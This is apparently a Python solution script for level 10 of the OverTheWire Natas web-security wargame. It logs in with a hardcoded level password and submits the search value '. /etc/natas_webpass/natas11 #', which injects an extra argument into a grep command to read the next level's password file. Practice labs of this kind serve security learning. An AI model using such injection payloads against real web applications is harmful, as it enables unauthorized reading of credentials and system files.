# t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas10'
password = 't7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu'

url = 'http://%s.natas.labs.overthewire.org/' % username

try:
    session = requests.Session()

    # GET request to initially fetch the content for debugging
    response = session.get(url, auth=(username, password))
    print("Initial GET Response Status Code:", response.status_code)

    # POST request to submit the needle value and retrieve natas11 password
    response = session.post(url, data={"needle": ". /etc/natas_webpass/natas11 #", "submit": "submit"}, auth=(username, password))
    content = response.text

    # Uncomment the line below to print the entire content of the response
    # print(content)

    # Using regular expression to find the password for natas11
    matches = re.findall(r'<pre>\n(.*)\n</pre>', content)

    if matches:
        password_natas11 = matches[0].strip()  # Strip any leading or trailing whitespace
        print("Password for natas11:", password_natas11)
    else:
        print("Password for natas11 not found in the response.")
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
